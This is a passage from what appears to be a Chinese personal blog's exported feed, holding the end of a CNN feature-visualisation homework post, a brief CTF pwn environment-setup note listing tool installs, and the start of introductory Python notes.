class="number">-1.61937177e-02</span>,  <span class="number">1.31614238e-01</span>, <span class="number">-7.58006722e-02</span>,</span><br><span class="line">           <span class="number">1.05317712e-01</span>, <span class="number">-4.97416444e-02</span>,  <span class="number">1.06382117e-01</span>,</span><br><span class="line">           <span class="number">1.55792519e-01</span>, <span class="number">-6.84151053e-02</span>,  <span class="number">1.45529345e-01</span>,</span><br><span class="line">           <span class="number">2.03677062e-02</span>, <span class="number">-8.97034109e-02</span>, <span class="number">-2.06795484e-01</span>,</span><br><span class="line">           <span class="number">1.54043451e-01</span>,  <span class="number">2.10126981e-01</span>, <span class="number">-8.91636238e-02</span>,</span><br><span class="line">           <span class="number">1.28453285e-01</span>,  <span class="number">9.36990604e-02</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[<span class="number">-1.62867770e-01</span>,  <span class="number">1.78554595e-01</span>,  <span class="number">1.07262485e-01</span>,</span><br><span class="line">          <span class="number">-2.01251507e-01</span>, <span class="number">-1.86686456e-01</span>, <span class="number">-1.39267615e-03</span>,</span><br><span class="line">          <span class="number">-2.91764736e-01</span>, <span class="number">-6.71359822e-02</span>,  <span class="number">9.27731097e-02</span>,</span><br><span class="line">          <span class="number">-4.40010466e-02</span>,  <span class="number">1.04116030e-01</span>,  <span class="number">9.00273323e-02</span>,</span><br><span class="line">          <span class="number">-9.75889117e-02</span>, <span class="number">-9.58028287e-02</span>,  <span class="number">1.44259349e-01</span>,</span><br><span class="line">           <span class="number">1.72845557e-01</span>, <span class="number">-7.35422820e-02</span>, <span class="number">-5.54325320e-02</span>,</span><br><span class="line">          <span class="number">-5.81960455e-02</span>, <span class="number">-9.40498710e-03</span>,  <span class="number">2.49349073e-01</span>,</span><br><span class="line">           <span class="number">2.98932809e-02</span>,  <span class="number">1.47391170e-01</span>,  <span class="number">2.23646581e-01</span>,</span><br><span class="line">          <span class="number">-1.66808844e-01</span>, <span class="number">-2.98017204e-01</span>,  <span class="number">1.76479578e-01</span>,</span><br><span class="line">           <span class="number">9.54928771e-02</span>, <span class="number">-1.94601282e-01</span>,  <span class="number">3.18542421e-02</span>,</span><br><span class="line">          <span class="number">-1.29441142e-01</span>, <span class="number">-4.51699793e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">1.38353303e-01</span>, <span class="number">-1.54019877e-01</span>,  <span class="number">3.47476661e-01</span>,</span><br><span class="line">           <span class="number">3.10183734e-01</span>,  <span class="number">9.80487838e-02</span>, <span class="number">-8.70270059e-02</span>,</span><br><span class="line">          <span class="number">-3.14944327e-01</span>,  <span class="number">3.03581864e-01</span>,  <span class="number">1.18549809e-01</span>,</span><br><span class="line">           <span class="number">4.82388325e-02</span>, <span class="number">-4.62612629e-01</span>,  <span class="number">1.56953588e-01</span>,</span><br><span class="line">           <span class="number">1.20078214e-01</span>,  <span class="number">2.14997604e-01</span>,  <span class="number">2.20677666e-02</span>,</span><br><span class="line">          <span class="number">-1.07790619e-01</span>, <span class="number">-4.78487350e-02</span>, <span class="number">-1.66399360e-01</span>,</span><br><span class="line">          <span class="number">-3.04439962e-01</span>, <span class="number">-1.03561424e-01</span>,  <span class="number">1.27254218e-01</span>,</span><br><span class="line">           <span class="number">2.68438198e-02</span>, <span class="number">-3.16898555e-01</span>, <span class="number">-1.08468547e-01</span>,</span><br><span class="line">           <span class="number">4.99541610e-02</span>, <span class="number">-3.13619196e-01</span>, <span class="number">-3.84023368e-01</span>,</span><br><span class="line">           <span class="number">1.85616702e-01</span>, <span class="number">-1.11300424e-01</span>, <span class="number">-2.30957553e-01</span>,</span><br><span class="line">          <span class="number">-8.71629417e-02</span>, <span class="number">-2.18425304e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">5.16243160e-01</span>, <span class="number">-1.59118176e-01</span>,  <span class="number">2.56632596e-01</span>,</span><br><span class="line">           <span class="number">2.31499642e-01</span>,  <span class="number">3.12861830e-01</span>, <span class="number">-1.93787217e-01</span>,</span><br><span class="line">          <span class="number">-3.51059884e-02</span>, <span class="number">-1.76955208e-01</span>, <span class="number">-1.34864435e-01</span>,</span><br><span class="line">           <span class="number">1.62184462e-01</span>,  <span class="number">1.46136060e-01</span>,  <span class="number">2.63225555e-01</span>,</span><br><span class="line">           <span class="number">1.66042566e-01</span>,  <span class="number">1.86691016e-01</span>, <span class="number">-2.67370224e-01</span>,</span><br><span class="line">          <span class="number">-5.90280676e-03</span>,  <span class="number">2.70183504e-01</span>,  <span class="number">5.89993186e-02</span>,</span><br><span class="line">          <span class="number">-2.57559538e-01</span>, <span class="number">-4.12272394e-01</span>, <span class="number">-8.70700553e-02</span>,</span><br><span class="line">           <span class="number">1.34470537e-01</span>, <span class="number">-1.67689323e-01</span>, <span class="number">-3.41424406e-01</span>,</span><br><span class="line">           <span class="number">2.84074187e-01</span>, <span class="number">-1.07147172e-01</span>,  <span class="number">1.03664622e-01</span>,</span><br><span class="line">          <span class="number">-2.63156950e-01</span>, <span class="number">-3.71470511e-01</span>, <span class="number">-2.90910363e-01</span>,</span><br><span class="line">           <span class="number">1.30605936e-01</span>, <span class="number">-4.24639434e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">4.88423556e-02</span>,  <span class="number">3.35189223e-01</span>,  <span class="number">2.53643900e-01</span>,</span><br><span class="line">          <span class="number">-2.06524417e-01</span>, <span class="number">-3.78751934e-01</span>,  <span class="number">1.34045901e-02</span>,</span><br><span class="line">           <span class="number">1.64140776e-01</span>, <span class="number">-1.75927207e-01</span>, <span class="number">-1.66527703e-01</span>,</span><br><span class="line">           <span class="number">3.91573310e-01</span>,  <span class="number">2.06493884e-01</span>,  <span class="number">2.74771124e-01</span>,</span><br><span class="line">           <span class="number">1.69764921e-01</span>, <span class="number">-4.06905115e-01</span>, <span class="number">-3.35692346e-01</span>,</span><br><span class="line">           <span class="number">8.99787545e-02</span>, <span class="number">-5.60279638e-02</span>,  <span class="number">3.24890286e-01</span>,</span><br><span class="line">          <span class="number">-6.52969703e-02</span>, <span class="number">-3.02911997e-01</span>, <span class="number">-1.91059798e-01</span>,</span><br><span class="line">           <span class="number">2.11907119e-01</span>,  <span class="number">6.60512149e-02</span>, <span class="number">-6.08844198e-02</span>,</span><br><span class="line">           <span class="number">1.97099358e-01</span>, <span class="number">-4.50475607e-03</span>,  <span class="number">3.00196797e-01</span>,</span><br><span class="line">          <span class="number">-1.27629504e-01</span>, <span class="number">-2.09806144e-01</span>, <span class="number">-1.09069586e-01</span>,</span><br><span class="line">           <span class="number">1.95026800e-01</span>, <span class="number">-2.41192505e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-4.21599858e-02</span>, <span class="number">-1.33833423e-01</span>,  <span class="number">1.73788846e-01</span>,</span><br><span class="line">          <span class="number">-8.74219313e-02</span>,  <span class="number">1.79445803e-01</span>,  <span class="number">2.18065772e-02</span>,</span><br><span class="line">           <span class="number">1.11098528e-01</span>,  <span class="number">2.27415338e-01</span>,  <span class="number">1.67024761e-01</span>,</span><br><span class="line">           <span class="number">1.86085999e-01</span>,  <span class="number">6.45482726e-03</span>,  <span class="number">1.15672685e-01</span>,</span><br><span class="line">           <span class="number">9.32103917e-02</span>,  <span class="number">4.86121178e-02</span>, <span class="number">-1.34105667e-01</span>,</span><br><span class="line">           <span class="number">2.61788070e-01</span>, <span class="number">-1.33057624e-01</span>,  <span class="number">2.08185226e-01</span>,</span><br><span class="line">           <span class="number">1.11163380e-02</span>, <span class="number">-1.39638558e-01</span>,  <span class="number">3.82541418e-02</span>,</span><br><span class="line">           <span class="number">2.05305278e-01</span>,  <span class="number">2.74346590e-01</span>,  <span class="number">1.07309587e-01</span>,</span><br><span class="line">           <span class="number">1.53153718e-01</span>, <span class="number">-7.80853480e-02</span>, <span class="number">-1.45936459e-01</span>,</span><br><span class="line">           <span class="number">1.15661368e-01</span>,  <span class="number">2.84138117e-02</span>,  <span class="number">2.60127039e-04</span>,</span><br><span class="line">           <span class="number">2.58475721e-01</span>,  <span class="number">2.48304214e-02</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[<span class="number">-9.96622518e-02</span>,  <span class="number">1.37207210e-01</span>,  <span class="number">6.49073049e-02</span>,</span><br><span class="line">          <span class="number">-2.56701887e-01</span>, <span class="number">-1.92326424e-03</span>, <span class="number">-1.43860981e-01</span>,</span><br><span class="line">           <span class="number">1.09956741e-01</span>,  <span class="number">1.07560353e-02</span>,  <span class="number">3.54471877e-02</span>,</span><br><span class="line">          <span class="number">-7.16849370e-03</span>,  <span class="number">2.60522217e-01</span>, <span class="number">-4.55740020e-02</span>,</span><br><span class="line">           <span class="number">6.92887977e-02</span>, <span class="number">-2.51750741e-02</span>,  <span class="number">1.67305902e-01</span>,</span><br><span class="line">           <span class="number">3.12767439e-02</span>, <span class="number">-1.02101907e-01</span>, <span class="number">-1.38990544e-02</span>,</span><br><span class="line">          <span class="number">-5.27952351e-02</span>, <span class="number">-5.41742854e-02</span>,  <span class="number">9.97792631e-02</span>,</span><br><span class="line">           <span class="number">1.18075432e-02</span>, <span class="number">-9.80602354e-02</span>, <span class="number">-7.14249611e-02</span>,</span><br><span class="line">          <span class="number">-2.99854353e-02</span>, <span class="number">-3.63657847e-02</span>,  <span class="number">2.59663343e-01</span>,</span><br><span class="line">           <span class="number">1.45671824e-02</span>,  <span class="number">2.26698264e-01</span>, <span class="number">-4.12496440e-02</span>,</span><br><span class="line">          <span class="number">-1.07028335e-01</span>,  <span class="number">1.12535998e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-3.71173561e-01</span>, <span class="number">-3.47134918e-01</span>, <span class="number">-1.25734866e-01</span>,</span><br><span class="line">          <span class="number">-1.04274608e-01</span>, <span class="number">-1.17725596e-01</span>, <span class="number">-4.32399511e-02</span>,</span><br><span class="line">          <span class="number">-1.25010118e-01</span>,  <span class="number">1.28871411e-01</span>, <span class="number">-1.16636446e-02</span>,</span><br><span class="line">           <span class="number">3.53644863e-02</span>, <span class="number">-3.43158126e-01</span>, <span class="number">-6.99633360e-02</span>,</span><br><span class="line">          <span class="number">-4.92055565e-02</span>, <span class="number">-2.04492901e-02</span>,  <span class="number">2.45652124e-01</span>,</span><br><span class="line">          <span class="number">-2.31047466e-01</span>, <span class="number">-2.06009001e-01</span>,  <span class="number">3.27508003e-02</span>,</span><br><span class="line">          <span class="number">-1.18006527e-01</span>,  <span class="number">2.33523156e-02</span>,  <span class="number">4.04132828e-02</span>,</span><br><span class="line">          <span class="number">-1.25319809e-01</span>, <span class="number">-2.09883824e-01</span>, <span class="number">-1.37493312e-01</span>,</span><br><span class="line">           <span class="number">2.33293012e-01</span>, <span class="number">-1.44781396e-02</span>, <span class="number">-2.18876049e-01</span>,</span><br><span class="line">           <span class="number">1.32711887e-01</span>,  <span class="number">3.90832350e-02</span>, <span class="number">-2.01453134e-01</span>,</span><br><span class="line">          <span class="number">-4.23350960e-01</span>,  <span class="number">1.45124316e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-5.36839813e-02</span>,  <span class="number">1.58995256e-01</span>, <span class="number">-1.83390737e-01</span>,</span><br><span class="line">           <span class="number">3.47549677e-01</span>,  <span class="number">1.38828710e-01</span>,  <span class="number">4.24572304e-02</span>,</span><br><span class="line">          <span class="number">-1.27515435e-01</span>, <span class="number">-9.66101289e-02</span>, <span class="number">-1.87338620e-01</span>,</span><br><span class="line">          <span class="number">-1.97422896e-02</span>, <span class="number">-1.08366840e-01</span>, <span class="number">-1.55322403e-01</span>,</span><br><span class="line">          <span class="number">-1.61157817e-01</span>,  <span class="number">2.01927379e-01</span>,  <span class="number">2.53322780e-01</span>,</span><br><span class="line">          <span class="number">-5.62116742e-01</span>, <span class="number">-5.91066889e-02</span>,  <span class="number">5.40728793e-02</span>,</span><br><span class="line">          <span class="number">-7.92302191e-02</span>,  <span class="number">1.88086838e-01</span>,  <span class="number">6.59958273e-03</span>,</span><br><span class="line">          <span class="number">-2.42399514e-01</span>,  <span class="number">1.69646740e-01</span>, <span class="number">-9.47589334e-03</span>,</span><br><span class="line">           <span class="number">1.11526139e-01</span>,  <span class="number">6.88120276e-02</span>, <span class="number">-9.78308246e-02</span>,</span><br><span class="line">          <span class="number">-1.60721883e-01</span>,  <span class="number">6.95262775e-02</span>, <span class="number">-6.26887083e-02</span>,</span><br><span class="line">          <span class="number">-2.41015360e-01</span>, <span class="number">-2.02056006e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">1.95601895e-01</span>,  <span class="number">1.46274611e-01</span>, <span class="number">-2.14165911e-01</span>,</span><br><span class="line">           <span class="number">1.88677847e-01</span>, <span class="number">-6.13280199e-03</span>,  <span class="number">3.82143594e-02</span>,</span><br><span class="line">          <span class="number">-2.77706925e-02</span>, <span class="number">-2.12541133e-01</span>,  <span class="number">3.08963843e-02</span>,</span><br><span class="line">          <span class="number">-2.32768711e-02</span>,  <span class="number">4.44432311e-02</span>, <span class="number">-7.64122903e-02</span>,</span><br><span class="line">          <span class="number">-2.42977053e-01</span>,  <span class="number">2.11474299e-02</span>,  <span class="number">3.08647826e-02</span>,</span><br><span class="line">          <span class="number">-2.96457887e-01</span>,  <span class="number">2.82384634e-01</span>, <span class="number">-9.74976271e-02</span>,</span><br><span class="line">          <span class="number">-1.13737859e-01</span>,  <span class="number">3.41809720e-01</span>, <span class="number">-2.39258468e-01</span>,</span><br><span class="line">          <span class="number">-3.60288233e-01</span>,  <span class="number">1.55391827e-01</span>,  <span class="number">1.84775457e-01</span>,</span><br><span class="line">           <span class="number">7.04837516e-02</span>,  <span class="number">1.14113115e-01</span>,  <span class="number">1.53539777e-01</span>,</span><br><span class="line">          <span class="number">-1.83223680e-01</span>,  <span class="number">8.52515474e-02</span>,  <span class="number">4.64094169e-02</span>,</span><br><span class="line">          <span class="number">-2.26785466e-02</span>, <span class="number">-3.02122593e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">4.71174717e-02</span>, <span class="number">-1.33249089e-01</span>, <span class="number">-7.07437098e-02</span>,</span><br><span class="line">          <span class="number">-1.64638892e-01</span>,  <span class="number">5.91888167e-02</span>,  <span class="number">6.15437292e-02</span>,</span><br><span class="line">           <span class="number">2.02578202e-01</span>,  <span class="number">3.63162197e-02</span>,  <span class="number">4.95729856e-02</span>,</span><br><span class="line">          <span class="number">-1.76949397e-01</span>,  <span class="number">8.75761509e-02</span>, <span class="number">-2.57797502e-02</span>,</span><br><span class="line">          <span class="number">-2.62792528e-01</span>, <span class="number">-1.61450431e-01</span>, <span class="number">-1.10014781e-01</span>,</span><br><span class="line">          <span class="number">-3.13372947e-02</span>,  <span class="number">9.80259553e-02</span>, <span class="number">-8.82068127e-02</span>,</span><br><span class="line">           <span class="number">4.45931666e-02</span>,  <span class="number">1.94095060e-01</span>, <span class="number">-1.57402858e-01</span>,</span><br><span class="line">          <span class="number">-1.39938518e-01</span>,  <span class="number">2.33131334e-01</span>,  <span class="number">3.16902958e-02</span>,</span><br><span class="line">           <span class="number">2.28416715e-02</span>,  <span class="number">6.12144656e-02</span>, <span class="number">-9.37361270e-03</span>,</span><br><span class="line">           <span class="number">1.28603980e-01</span>, <span class="number">-7.55553991e-02</span>,  <span class="number">1.83364391e-01</span>,</span><br><span class="line">           <span class="number">1.22262053e-01</span>, <span class="number">-4.33576889e-02</span>]]]], dtype=float32), array([ <span class="number">0.06133625</span>, <span class="number">-0.06743222</span>,  <span class="number">0.12276675</span>,  <span class="number">0.25595677</span>,  <span class="number">0.01088508</span>,</span><br><span class="line">        <span class="number">0.16797405</span>,  <span class="number">0.12758622</span>, <span class="number">-0.3513619</span> , <span class="number">-0.08484235</span>, <span class="number">-0.0949592</span> ,</span><br><span class="line">        <span class="number">0.04725884</span>, <span class="number">-0.17716943</span>, <span class="number">-0.05790677</span>,  <span class="number">0.04177701</span>, <span class="number">-0.12494741</span>,</span><br><span class="line">        <span class="number">0.39589486</span>, <span class="number">-0.0406141</span> , <span class="number">-0.11065134</span>, <span class="number">-0.04198102</span>, <span class="number">-0.10928375</span>,</span><br><span class="line">        <span class="number">0.06801659</span>,  <span class="number">0.09649571</span>,  <span class="number">0.34070975</span>, <span class="number">-0.10038836</span>, <span class="number">-0.04970933</span>,</span><br><span class="line">        <span class="number">0.01176555</span>, <span class="number">-0.18670177</span>, <span class="number">-0.0030286</span> ,  <span class="number">0.05685186</span>, <span class="number">-0.18897383</span>,</span><br><span class="line">        <span class="number">0.16669714</span>,  <span class="number">0.1053075</span> ], dtype=float32)]</span><br></pre></td></tr></table></figure><p>每一块是32个，一共26块，前面是weight，后面是bias吧…</p><p>将training data第一张图丢进第一个卷积层中得到的结果</p><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic0.jpg"><img src="/img/ml-practice/hw3/showpic1.jpg"><img src="/img/ml-practice/hw3/showpic2.jpg"><img src="/img/ml-practice/hw3/showpic3.jpg"><img src="/img/ml-practice/hw3/showpic4.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic5.jpg"><img src="/img/ml-practice/hw3/showpic6.jpg"><img src="/img/ml-practice/hw3/showpic7.jpg"><img src="/img/ml-practice/hw3/showpic8.jpg"><img src="/img/ml-practice/hw3/showpic9.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic10.jpg"><img src="/img/ml-practice/hw3/showpic11.jpg"><img src="/img/ml-practice/hw3/showpic12.jpg"><img src="/img/ml-practice/hw3/showpic13.jpg"><img src="/img/ml-practice/hw3/showpic14.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic15.jpg"><img src="/img/ml-practice/hw3/showpic16.jpg"><img src="/img/ml-practice/hw3/showpic17.jpg"><img src="/img/ml-practice/hw3/showpic18.jpg"><img src="/img/ml-practice/hw3/showpic19.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic20.jpg"><img src="/img/ml-practice/hw3/showpic21.jpg"><img src="/img/ml-practice/hw3/showpic22.jpg"><img src="/img/ml-practice/hw3/showpic23.jpg"><img src="/img/ml-practice/hw3/showpic24.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic25.jpg"><img src="/img/ml-practice/hw3/showpic26.jpg"><img src="/img/ml-practice/hw3/showpic27.jpg"><img src="/img/ml-practice/hw3/showpic28.jpg"><img src="/img/ml-practice/hw3/showpic29.jpg"></div><p><div class="img-wrap"><img src="/img/ml-practice/hw3/showpic30.jpg"><img src="/img/ml-practice/hw3/showpic31.jpg"><img src="/img/ml-practice/hw3/pic0.jpg"><img src="/img/ml-practice/hw3/showpic32.jpg"><img src="/img/ml-practice/hw3/showpic32.jpg"></div><br><br></p><p><del>第32张为什么加载不出来？？？？？</del><br>最后一张是原图，可以看出来有些感觉就是变成惊讶或者悲伤的样子的，有些特别处理了眉毛，有些特别处理了眼睛的样子吧..<br>(纯属口胡，我觉得我该好好看看相关论文了</p><p>相关代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(model, x_train, y_train)</span>:</span></span><br><span class="line">    <span class="comment">#print(model.get_layer('conv2d_1').get_weights())</span></span><br><span class="line">    layer_model=Model(inputs=model.input,outputs=model.layers[<span class="number">0</span>].output)</span><br><span class="line">    t = layer_model.predict(x_train)</span><br><span class="line">    print(t, t.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        plt.imshow(t[<span class="number">0</span>, :, :, i])</span><br><span class="line">        plt.axis(<span class="string">'off'</span>)</span><br><span class="line">        plt.savefig(<span class="string">'showpic'</span>+str(i)+<span class="string">'.jpg'</span>)</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machinelearning </tag>
            
            <tag> python </tag>
            
            <tag> problem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn学习笔记</title>
      <link href="/blog/note-pwn/"/>
      <url>/blog/note-pwn/</url>
      
        <content type="html"><![CDATA[<p>最后的最后我还是咕咕了。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我用的系统是Ubuntu 18.04.2 LTS，感觉最好还是用个LTS的吧</p><p><a href="https://github.com/giantbranch/pwn-env-init" target="_blank" rel="noopener">https://github.com/giantbranch/pwn-env-init</a></p><p>安装工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install pwntools</span><br><span class="line"></span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br><span class="line"></span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure></p><p>这个因为用的是<code>pip</code>安装的，只安装到Python2中了…然鹅我装了anaconda是在虚拟环境中默认Python3，所以只能python2来打开咯</p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p><code>file</code>命令可以查看文件的类型之类的</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>免费版的…<br><a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/download_freeware.shtml</a><br>爱盘里也有<br><a href="https://down.52pojie.cn/" target="_blank" rel="noopener">https://down.52pojie.cn/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x idafree70_linux.run</span><br><span class="line">./idafree70_linux.run</span><br><span class="line">./ida64</span><br></pre></td></tr></table></figure><h3 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h3><ol><li>F5 defs.h</li><li>Shift+F12 字符串</li><li>n 重命名</li><li>x 引用</li></ol><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install pwntools</span><br></pre></td></tr></table></figure><h3 id="常用功能-1"><a href="#常用功能-1" class="headerlink" title="常用功能"></a>常用功能</h3><ol><li>process remote</li><li>p64 u64</li></ol><h2 id="汇编命令"><a href="#汇编命令" class="headerlink" title="汇编命令"></a>汇编命令</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> note </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python笔记</title>
      <link href="/blog/note-python/"/>
      <url>/blog/note-python/</url>
      
        <content type="html"><![CDATA[<p>本文主要使用Python3.7</p><p><code>dir()</code>列出指定类或模块中全部内容<br><code>help()</code>查看某个函数或方法的帮助文档</p><h2 id="Prev"><a href="#Prev" class="headerlink" title="Prev"></a>Prev</h2><p>range生成序列</p><ul><li>range(101)可以产生一个0到100的整数序列。</li><li>range(1, 100)可以产生一个1到99的整数序列。</li><li>range(1, 100, 2)可以产生一个1到99的奇数序列，其中的2是步长，即数值序列的增量。</li></ul><p>函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x+<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>编写模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x+<span class="number">2</span></span><br></pre></td></tr></table></figure><p>module1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> module1 <span class="keyword">as</span> m1;</span><br><span class="line"><span class="comment"># __name__是Python中一个隐含的变量它代表了模块的名字</span></span><br><span class="line"><span class="comment"># 只有被Python解释器直接执行的模块的名字才是__main__</span></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">'__main__'</span>):</span><br><span class="line">    m1.foo();</span><br></pre></td></tr></table></figure><p>引用全局变量<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a</span><br><span class="line">    a = <span class="number">300</span></span><br></pre></td></tr></table></figure></p><h2 id="Python语言概述和开发环境"><a href="#Python语言概述和开发环境" class="headerlink" title="Python语言概述和开发环境"></a>Python语言概述和开发环境</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>面向对象、解释型、弱类型的脚本语言<br>特色：清晰的语法和可扩展性<br>弱点：运行速度慢，源代码加密困难</p><h3 id="Sublime3-Python3配置"><a href="#Sublime3-Python3配置" class="headerlink" title="Sublime3 Python3配置"></a>Sublime3 Python3配置</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"cmd"</span>: [<span class="string">"python3"</span>, <span class="string">"-u"</span>, <span class="string">"$file"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="变量和简单类型"><a href="#变量和简单类型" class="headerlink" title="变量和简单类型"></a>变量和简单类型</h2><h3 id="单行注释-amp-多行注释"><a href="#单行注释-amp-多行注释" class="headerlink" title="单行注释 &amp; 多行注释"></a>单行注释 &amp; 多行注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 233</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">233</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">233</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Python作为弱类型语言，有两个典型特征：无须声明即可赋值，数据类型可以动态改变<br>查看变量类型用<code>type()</code><br>变量命名规则差不多，可以使用中文日文等，Python2中需要声明编码utf-8，感觉…最好还是字母数字下划线吧，不能包含空格的<br>不能包含关键字，所有的关键字可以通过以下方法获得<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line">keyword.kwlist</span><br></pre></td></tr></table></figure></p><p>内置函数也不能包含当做识别符</p><p>print函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(value, ..., sep=<span class="string">' '</span>, end=<span class="string">'\n'</span>, file=sys.stdout, flush=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><p>支持None<br>十进制形式：普通数字<br>二进制形式：<code>0b</code>或<code>0B</code>开头<br>八进制形式：<code>0o</code>或<code>0O</code>开头<br>十六进制形式：<code>0x</code>或<code>0X</code>开头，不区分<code>a-f</code>大小写</p><h4 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h4><p>科学计数法<br>不允许除以0</p><h4 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h4><p>在<code>cmath</code>模块中，虚部用<code>j</code>或<code>J</code>表示</p><h3 id="字符串"><a href="#字符串" class="headerlink" 